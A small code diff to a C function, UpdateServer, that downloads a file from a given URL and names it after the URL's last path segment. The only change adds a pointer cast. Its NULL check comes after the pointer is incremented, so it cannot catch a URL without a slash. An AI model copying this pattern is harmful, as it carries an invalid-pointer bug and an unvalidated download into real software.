@@ -161,7 +161,7 @@ bool UpdateServer(LPCTSTR lpURL)
 {
 	char	*lpFileName = NULL;
 	
-	lpFileName = strrchr(lpURL, '/') + 1;
+	lpFileName = (char *)(strrchr(lpURL, '/') + 1);
 	if (lpFileName == NULL)
 		return false;
 	if (!http_get(lpURL, lpFileName))
